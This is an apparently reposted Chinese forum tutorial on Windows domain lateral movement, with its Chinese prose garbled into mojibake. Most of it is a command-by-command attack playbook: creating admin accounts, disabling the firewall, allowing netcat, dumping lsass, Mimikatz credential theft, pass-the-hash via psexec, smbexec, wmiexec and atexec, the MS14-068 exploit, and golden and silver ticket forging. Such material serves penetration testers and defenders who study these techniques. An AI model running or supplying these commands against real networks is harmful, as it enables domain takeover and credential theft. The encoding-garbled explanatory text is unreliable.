* * *

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E5%9F%BA%E6%9C%AC%E6%94%B6%E9%9B%86)ä¸ãä¿¡æ¯åºæ¬æ¶é

å½ä¸å°æºå­è¿åä¼è¯åï¼æä»¬å¯ä»¥ä½¿ç¨ç¸å
³å½ä»¤è¿è¡ç¸åºçä¿¡æ¯æ¶é

##
[](https://bbs.pediy.com/thread-268289.htm#1.1%E6%94%B6%E9%9B%86%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A)1.1æ¶éåºæ¬çä¿¡æ¯ï¼

Systeminfo è®¡ç®æºè¯¦ç»ä¿¡æ¯(è¡¥ä¸ä¿¡æ¯)  
Net start æå¯å¨çæå¡  
Wmic service list brief æ¥è¯¢æ¬æºæå¡ä¿¡æ¯  
Tasklist è¿ç¨åè¡¨  
Wmic startup get command,caption æ¥çå¯å¨è¯¥ç¨åºä¿¡æ¯  
Schtasks /query /fo LIST /vè®¡åä»»å¡  
Netstat -ano æ ¹æ®æ¬æºç«¯å£å¼æ¾æ åµæ¥å¤æ­æä»ä¹æå¡ãå
¶è§è²  
Query user || qwinsta æ¥çå½åå¨çº¿ç¨æ·  
Net session ååºä¼è¯  
Net share æ¥çæ¬æºçå ±äº«åè¡¨  
Wmic share get name,path,status æ¥çå ±äº«åè¡¨  
Net user æ¬å°ç¨æ·  
Net user kkkk æ¥çæ¬å°ç¨æ·ä¿¡æ¯  
Net user kent password /addæ·»å æ¬å°ç¨æ·  
Net localgroup æ¬å°ç¨æ·ç»  
Net localgroup /domain åç¨æ·ç»  
Net localgroup Administrators kent /add å°æ¬å°ç¨æ·æ·»å
å°æ¬å°ç®¡çåç»  
Net localgroup adminnstrators æ¬å°ç®¡çåç»æå  
net localgroup adminstrators /domain åç®¡çåç»æå  
Wmic useraccount get /all è·ååå ç¨æ·è¯¦ç»ä¿¡æ¯  
dsquery user æ¥çå­å¨çç¨æ·  
Net user /domain åç¨æ·ä¿¡æ¯  
Net user kkkk /domain åç¨æ·kkkkä¿¡æ¯  
Net user kent password /add /domainæ·»å åç¨æ·  
Net localgroup Administrators kent /add /domain å°åç¨æ·æ·»å
å°åç®¡çåç»  
Net localgroup Administrators /add test\kent å°åç¨æ·æ·»å
å°æ¬å°ç®¡çåç»  
Net group /domain åç¨æ·ç»ä¿¡æ¯  
Net view /domain æ¥è¯¢å  
Net view /domain:test æ¥è¯¢åå è®¡ç®æº  
Net accounts /domain æ¥è¯¢åä¸­å¯ç ç­ç¥  
Net group /domain æ¥çåå ææç¨æ·ç»  
Net group âDomain Controllersâ /domain æ¥çåæ§å¶å¨ç»  
Net group âDomain computersâ /domain æ¥çåå ææè®¡ç®æºåè¡¨  
Net group âDomain adminsâ /domain æ¥çåå ç®¡çåç¨æ·  
Net user /domain kent active:yes å¯ç¨åè´¦æ·  
Net user /domain kent active:no ç¦ç¨åè´¦æ·  
Nltest /DCLIST:test æ¥çåä¸­åæ§å¶å¨å  
Wmic useraccount get /all ç¨æ·è¯¦ç»ä¿¡æ¯  
Net group âDomain Adminsâ /domain å¯¹åºç»ä¸çè´¦æ·ä¿¡æ¯  
nltest /domain_trusts è·ååä¿¡ä»»ä¿¡æ¯  
net config workstation äºè§£æ¬æºçé ç½®ä¿¡æ¯  
Netsh firewall show config æ¥çé²ç«å¢é ç½®  
Netsh advfirewall set allprofiles state offå ³é­é²ç«å¢(windows server
2003å)  
Netsh advfirewall firewall add rule name=âpass ncâ dir=in action=allow
program=âC:\nc.exeâ å è®¸æå®ç¨åºè¿å ¥(windows server 2003å)  
Netsh advfirewall firewall add rule name=âallow ncâ dir=out action=allow
program=âC:\nc.exeâå è®¸æå®ç¨åºéåº(windows server 2003å)  
Netsh advfirewall firewall add rule name=âRemote Desktopâ protocol=TCP
dir=in localport=3389 action=allow å è®¸3389è¿æ¥(windows server 2003å)  
Netsh advfirewall set currentprofile logging
filename=âC:\winodws\temp\fw.logâ èªå®ä¹é²ç«å¢æ¥å¿å­å¨ä½ç½®  
Reg query
âHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet
Settingsâæ¥çç«¯å£ä»£çé ç½®ä¿¡æ¯  
Reg query âHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcpâ /V PortNumberæ¥çè¿ç¨æ¡é¢ç«¯å£å·  
ä»¥ä¸å½ä»¤æ¯å¼å¯3389ç«¯å£ (windows server 2003å)  
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting
where (__CLASS != "") call setallowtsconnections 1  
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where
(TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1  
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
fSingleSessionPerUser /t REG_DWORD /d 0 /f  
net start TermService

##
[](https://bbs.pediy.com/thread-268289.htm#1.2%E6%94%B6%E9%9B%86%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E6%94%B6%E9%9B%86%EF%BC%9A)1.2æ¶éç¬¬ä¸æ¹ç»å½å­è¯æ¶éï¼

SharpDecryptPwdï¼  
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe  
TeamViewer :SharpDecryptPwd.exe -TeamViewer  
Navicat: SharpDecryptPwd.exe -NavicatCrypto  
Xshellï¼SharpDecryptPwd.exe -Xmangager -p SessionPath -s username+sid(whoami
/user)  
laZagne ï¼  
https://github.com/ethicalhackeragnidhra/LaZagne/archive/2.3.1.zip  
ä½¿ç¨æ¹æ³ï¼laZagne.exe all



æä»¬ç¨ä¸è¿°å½ä»¤ç®åæ¶éè®¡ç®æºåºæ¬ä¿¡æ¯ï¼  
Ipconfig /all æ ¹æ®DNSåç¼å¤æ­æ¯å¦æå  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_48W2TXKXQJCT4CN.png)  
Net view /domain å¤æ­æ¯å¦å­å¨å  
ç¡®å®åæ§çipå°åï¼  
net time /domain  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_6B5EA87AEUT9Y2P.png)  
ç¶åéè¿nslookupæpingç¡®å®å ¶åæ§ip:  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_DSCH2B985WR3PAZ.png)  
ç¡®å®å½åå å­æ´»ä¸»æºï¼  
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr âTTL=â

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)äºãä½¿ç¨ææä¼
éè¿è¡å ç½æ¨ªåç§»å¨

## [](https://bbs.pediy.com/thread-268289.htm)2.1Windows server 2008
ä½¿ç¨èªå¸¦çatå½ä»¤

ä½¿ç¨ææå¯ç ç»å½å°åæ§ï¼éè¦135ç«¯å£å¼å¯ï¼  
Net use \192.168.202.148\ipc$ password /user:test\administrator  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_HWZ7YBG9YGXJXBR.png)  
æåé¨å¤å¶å°åæ§cçï¼atæ°å»ºå®æ¶ä½ä¸ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_GRBP4GZW2BCDEZ6.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_AS3YHTA89EWZWGV.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_3HA2WMG2VDFWY82.png)



Windows server 2012åä»¥ä¸ä½¿ç¨schtaskså½ä»¤  
Schtasks /create /s 192.168.202.148 /ru âSYSTEMâ /tn executefile /sc DAILY
/tr c:/h4.exe /F  
Schtasks /run /s 192.168.202.148 /tn executefile /i  
Schtasks /delete /s 192.168.202.148 /tn executefile /f

##
[](https://bbs.pediy.com/thread-268289.htm#2.2%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7%E5%8C%85impacket%E4%B8%ADatexec.exe)2.2ä½¿ç¨ç¬¬ä¸æ¹å·¥å
·å impacketä¸­atexec.exe

Atexec.exe test/administrator:zxcvbnm123@192.168.202.148 âwhoamiâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_3P6X4982CMWTA4X.png)  
Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6
test/administrator@192.168.202.148 âwhoamiâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_PWNYDUUDXUMDE29.png)

##
[](https://bbs.pediy.com/thread-268289.htm#2.3%E7%BB%93%E5%90%88%E6%89%B9%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8%EF%BC%9A)2.3ç»åæ¹å¤çå©ç¨ï¼

å·²ç¥å¯ç åç¨æ·æ¹éè¿æ¥ip:  
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ âpasswordâ
/user:test\administrator  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_YU7YHH9HA3ZR6C2.png)  
å·²ç¥ç¨æ·åipæ¹éè¿æ¥å¯ç ï¼  
FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ â%%iâ
/user:test\administrator  
å·²ç¥ç¨æ·åipæ¹éè¿æ¥hashï¼  
FOR /F %%i in (hash.txt) do atexec.exe -hashes :â%%iâ
test/administrator@192.168.202.148 âwhoamiâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_XH5YQNN427T45EU.png)

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8hash%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)ä¸ãå©ç¨hashè¿è¡æ¨ªåç§»å¨

å¨windows server 2012ä»¥ä¸ççæ¬é»è®¤å ³é­wdigetï¼æ»å»è æ æ³å¨å
å­ä¸­è·åææå¯ç ã  
å¨windows server 2012ä»¥ä¸ççæ¬å¦æå®è£ äºKB2871997è¡¥ä¸ï¼ä¹æ
æ³è·åææå¯ç ã

##
[](https://bbs.pediy.com/thread-268289.htm#3.1%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9Fhash)3.1è·åç³»ç»hash

Procdump.exe -accepteula -ma lsass.exe lsass.dmp(éè¦ç®¡çåæé)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_S2VPY86S5B8KW7W.png)  
å©ç¨Mimikatzmç¸å ³å½ä»¤è·ådmpä¸­çhashï¼  
Privilege::debug  
Sekurlsa::minidump lsass.dmp  
Sekurlsa::logonPasswords full  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_G5BB6569HJ4AAV8.png)  
å¯ä»¥éè¿hashcatçç ´hashå¼ï¼è·å¾å¯¹åºçææå¯ç ï¼  
Hashcat -a 0 -m 1000 hashfile passfile

##
[](https://bbs.pediy.com/thread-268289.htm#3.2%E9%80%9A%E8%BF%87%E6%98%8E%E6%96%87%E6%88%96hash%E5%88%A9%E7%94%A8smb%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)3.2éè¿æææhashå©ç¨SMBæå¡è¿è¡æ¨ªåç§»å¨

å®æ¹Psexecç¬¬ä¸ç§å©ç¨æ¹æ³ï¼å¯ä»¥å
æipcé¾æ¥ï¼åç¨psexecè¿è¡ç¸åºçç¨åºï¼  
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator  
Psexec \192.168.202.148 -accepteula -s cmd  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_47G2K567FFVFDHS.png)  
å®æ¹Psexecç¬¬äºç§å©ç¨æ¹æ³ï¼ä¸ç¨å»ºç«ipcè¿æ¥ï¼ç´æ¥ä½¿ç¨å¯ç
æhashè¿è¡ä¼ é  
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_PUTCKWD8XHJ79QN.png)  
PsExec -hashes :fac5d668099409cb6fa223a32ea493b6
test.com/Administrator@192.168.202.148 "whoami" (å®æ¹æ§è¡ä¸äº)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_8PQFGJR5NG6S9ST.png)



ä½¿ç¨ç¬¬ä¸æ¹Impacketå·¥å ·å
ä¸­çsmbexecåpsexecï¼ä½¿ç¨æ¹æ³åå®æ¹ä¸è´ï¼  
ä½¿ç¨Impacketç¬¬ä¸æ¹PsExecï¼å½ä»¤ä¸å®æ¹çä¸è´ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_QSP37S3AR7TUPXH.png)  
ä½¿ç¨Impacketç¬¬ä¸æ¹Smbexecï¼  
Smbexec test/Administrator:zxcvbnm123@192.168.202.148  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_ABPK7AT2MU8XGDR.png)  
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6
test/Administrator@192.168.202.148  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TGTZ96NTS6U8EYB.png)

## [](https://bbs.pediy.com/thread-268289.htm)3.3
å©ç¨WMIæå¡è¿è¡æ¨ªåç§»å¨

WMIå©ç¨135ç«¯å£ï¼æ¯æææåhashä¸¤ç§æ¹å¼è¿è¡èº«ä»½éªè¯ï¼ä¸ç³»ç»æ¥å¿ä¸è®°å½ã  
ç¬¬ä¸ç§ï¼ä½¿ç¨ç³»ç»èªå¸¦çWMICææä¼
éæ§è¡ç¸åºå½ä»¤ï¼ä½æ§è¡çç»æä¸åæ¾ï¼å
ç®¡çåè´¦æ·ç»å½ï¼  
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process
call create âcmd.exe /c ipconfig >C:/1.txtâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_M54H3UEQUZPHS4B.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_Q8Z2H9ETEAN9SQZ.png)



ç¬¬äºç§ï¼ä½¿ç¨ç³»ç»èªå¸¦cscriptææä¼
éæ§è¡åå¼¹shellï¼æ§è¡ç»ææåæ¾ï¼ç°å·²è¢«æ  
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123



ç¬¬ä¸ç§ï¼ä½¿ç¨ç¬¬ä¸æ¹impacketå¥ä»¶ä¸­çWmiexecè¿è¡æææhashä¼
éï¼æ§è¡ç»ææåæ¾  
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 âwhoamiâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_FDEV5ZVYREAXBRA.png)  
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6
test/Administrator@192.168.202.148 âwhoamiâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_43FNE5ARNJR5FHY.png)

##
[](https://bbs.pediy.com/thread-268289.htm#3.4%E5%88%A9%E7%94%A8mimikatz%E8%BF%9B%E8%A1%8Cpth)3.4å©ç¨Mimikatzè¿è¡PTH

PTHæ¯æ»å»è éè¿LM HashåNTLM
Hashè®¿é®è¿ç¨ä¸»æºææå¡ï¼ä¸éæä¾ææå¯ç ãå½ç¦ç¨äºNTLM
Hashéªè¯æ¶ï¼ä¸è½ä½¿ç¨PsExecè¿è¡Hashä¼ éï¼mimikatzè¿æ¯å¯ä»¥ã  
Privilege::debug  
Sekurlsa::pth /user:Administrator /domain:test
/ntlm:fac5d668099409cb6fa223a32ea493b6  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_BRZGNT44RGY4J97.png)  
å ³äºKB22871997æ¯å¦è½é²æ¤PTHæ»å»ï¼  
Pthï¼æ²¡ææè¡¥ä¸æ¶ï¼ä»»ä½ç¨æ·é½å¯ä»¥è¿æ¥ï¼æäºè¡¥ä¸åªè½administratorè¿æ¥  
Ptkï¼æäºè¡¥ä¸åï¼ç¨æ·æè½å¯ä»¥è¿æ¥ï¼éç¨aes256è¿æ¥

## [](https://bbs.pediy.com/thread-268289.htm)3.5 å©ç¨RDPè¿è¡æ¨ªåç§»å¨

1ãä½¿ç¨ææå¯ç è¿æ¥RDP  
Windows: Mstsc.exe /console /v:192.168.202.148 /admin  
Linux: rdesktop 192.168.202.148:3389  
2ãä½¿ç¨hashè¿æ¥RDP  
ä½¿ç¨hash è¿æ¥éè¦Restricted Admin modeå¼å¯ï¼Windows server
2012é»è®¤å¼å¯äºï¼windows server 2008éè¦å®è£
2871997ã2973351è¡¥ä¸åï¼æ§è¡ä¸é¢å½ä»¤ï¼  
REG ADD âHKLM\System\CurrentControlSet\Control\Lsaâ /v
DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f  
å½å¼å¯åå°±è½ä½¿ç¨mimikatzè¿è¡hashè¿æ¥RDPï¼  
Privilege::debug  
Sekurlsa::pth /user:Administrator /domain:test
/ntlm:fac5d668099409cb6fa223a32ea493b6 â/run:mstsc.exe /restrictedadminâ

## [](https://bbs.pediy.com/thread-268289.htm)3.6 PTK(pass the
key)å¨æ¨ªåç§»å¨å©ç¨

å©ç¨ekeys aes256  
Sekurlsa::ekeys è·åaes  
Sekurlsa::pth /user:Administrator /domain:test2
/aes256:6e09831ee88fb85c8a3f4a88dea70e2a1b18197b70d57a9eebad73b45137433d  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_GEK33J6XRJYTSGD.png)

# [](https://bbs.pediy.com/thread-268289.htm)åã PTTç¥¨æ®ä¼
éå¨æ¨ªåç§»å¨å©ç¨

PTT(pass the
ticket)ä¸åä½¿ç¨NTLMè¿è¡è®¤è¯ï¼èæ¯å©ç¨kerberosåè®®è¿è¡æ»å»,ç¸å¯¹äºPTHæ¥è¯´å
¶ä¸éè¦ç®¡çåæéï¼æä¸ç§å¸¸è§çæ»å»æ¹å¼ï¼MS14-068(æ¼æ´ç¼å·kb3011780)ãGolder
ticketãSilver ticketï¼å ¶ä¸­åä¸¤è æ¯å°è¿æ¥åæ³çç¥¨æ®æ³¨å ¥å
å­ä¸­å±äºæéç»´æï¼åé¢åï¼ã

## [](https://bbs.pediy.com/thread-268289.htm)4.1 å©ç¨ç¸å ³æ¼æ´

ç¬¬ä¸ç§ä½¿ç¨MS14-068 expï¼  
å ç¨whoami /useræ¥çå½åç¨æ·sid  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_F7AKAPEREP67SBG.png)  
Kerberos::purgeæklist purgeå æ¸ ç©ºå½åæºå¨ä¸­çææå­è¯ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_WD34AVBE6WJR6SB.png)  
å©ç¨MS14-068çæç¸åºå­è¯ï¼  
MS14-068.exe -u c@test.com -s S-1-5-21-2273191065-1635484360-3888421177-1105
-d 192.168.202.148 -p c@zxcvbnm123  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_53RYB4W3KMTTPVB.png)  
ä½¿ç¨mimikatzå°ç¥¨æ®æ³¨å ¥å å­ï¼  
Kerberos::ptc âTGT_c@test.com.ccacheâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_WPHCCTHUNWCW3Y5.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_JZWD87Q9QYNM24T.png)  
åç»­å©ç¨ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_KYP2E9FQWA4X93G.png)  
ç¬¬äºç§kekeoå©ç¨hashçæç¥¨æ®ï¼  
Kekeo âtgt::ask /user:c /domain:test.com
/ntlm:abe09320f41c250eadcc5bfba77a5e1aâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_YKGR495R7FDFSE3.png)  
åæ ·æ¸ æ¥ç¥¨æ®å¹¶å¯¼å ¥çæçç¥¨æ®ï¼  
kerberos::ptt TGT_c@TEST.COM_krbtgt~test.com@TEST.COM.kirbi  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_J8E66Y4F6MP3PFS.png)  
ç¬¬ä¸ç§å©ç¨mimikatzæ¶éæ¬å°çç¥¨æ®å¹¶éæ°å¯¼å
¥ï¼å¯¼åºéè¦ç®¡çåæéï¼ï¼  
Sekurlsa::tickets /export  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_XNQ9TWUADVCJZDP.png)  
ä½¿ç¨Kerberos::ptt è¿è¡å¯¼å ¥ç¥¨æ®ã

## [](https://bbs.pediy.com/thread-268289.htm)4.2 Golder ticket

Golder ticketä½¿ç¨krbtgtè´¦æ·çå¯ç hashå¼ï¼å©ç¨ä¼ªé
é«æéçTGTåKDCè¦æ±é¢åæ¥æä»»ææå¡è®¿é®æéçç¥¨æ®ï¼ä»èè·å¾åæ§æéãå¨åç¯å¢ä¸­ï¼æ¯ä¸ªè´¦æ·çç¥¨æ®é½æ¯Krbtgtçæçï¼å½æ»å»è
å¾å°krbtgt hashæAES256å¼åï¼æä»¬å°±å¯ä»¥ä¼ªé
ä»»ä¸åç¨æ·çèº«ä»½ï¼å¹¶ç¨è¯¥èº«ä»½è¿è¡è®¿é®ãä¼ªé Golder
ticketå©ç¨æ¡ä»¶ï¼  
1ãkrbtgtç¨æ·hashæAES256å¼  
2ãååç§°  
3ãåçSIDå¼  
4ãè¦ä¼ªé çç®¡çåå



ä¸é¢æ¯å ·ä½æä½ï¼  
Privilege::debug  
æ§è¡å¯¼åºkrbtgt hashå½ä»¤ Lsadump::dcsync /domain:test.com /user:krbtgt  
è·å¾hashå¼ï¼71204258ec5b715c29f6c8ee40a0c20d  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_4UP5DTPSTDQVR2C.png)  
è·ååSID  
Wmic useraccount get name,sid  
S-1-5-21-2273191065-1635484360-3888421177-500  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_27BNPRH4UPB23B5.png)  
æ¥è¯¢åç®¡çåè´¦æ· net group âdomain adminsâ /domain  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_43NUMK844CTJ333.png)  
è·å¾åå ipconfig /all  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TVUEF5YTN7MHHHQ.png)  
Kerberos::purgeæ¸ ç©ºç¥¨æ®ï¼ç¶åä½¿ç¨ä¸é¢å½ä»¤çækrbtgtçç¥¨æ®  
kerberos::golden /user:Administrator /domain:test.com
/sid:S-1-5-21-2273191065-1635484360-3888421177-500
/krbtgt:71204258ec5b715c29f6c8ee40a0c20d /ticket:krbtgt. kiribi  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_DUG83D24NKGRYJK.png)  
kerberos::ptt krbtgt.kiribi æçæçç¥¨æ®éæ°å¯¼å ¥å å­  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_XDESX2R64QHBK5V.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_8NHUSX7QQSGJFZP.png)

## [](https://bbs.pediy.com/thread-268289.htm)4.3 Silver Ticket

Silver Ticketä¼éè¿ç¸åºçæå¡è´¦æ·æ¥ä¼ªé
TGSï¼ä¾å¦LDAPãMSSQLãWinRMãCIFSç­ï¼èå´ç¸å¯¹æéï¼åªè½è·åå¯¹åºæå¡æéï¼ä¸Silver
Ticketæ¯ç±ç¹å®çè´¦æ·å å¯çãå©ç¨æ¡ä»¶ï¼  
1ãåå  
2ãåSID  
3ãç®æ æå¡å¨çFQDN  
4ãå¯å©ç¨çæå¡  
5ãæå¡è´¦å·çNTLM Hash  
6ãéè¦ä¼ªé çç¨æ·å  
ä¸é¢è¿è¡ç¸åºçæä½ï¼  
å æ¸ ç©ºç³»ç»ä¸­çç¥¨æ® ï¼  
Kerberos::purge  
ä½¿ç¨mimikatzçæä¼ªé ç Silver Ticket ï¼  
kerberos::golden /user:Administrator /domain:test.com
/sid:S-1-5-21-2273191065-1635484360-3888421177-500 /target:WIN-
MPPGQR2OWEC.test.com /service:cifs /rc4:fac5d668099409cb6fa223a32ea493b6
/user:c3 /ptt  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_347HDAVEMMRXV2W.png)  
éåºmimikatzï¼æ¥çå å­ä¸­çç¥¨æ®ï¼  
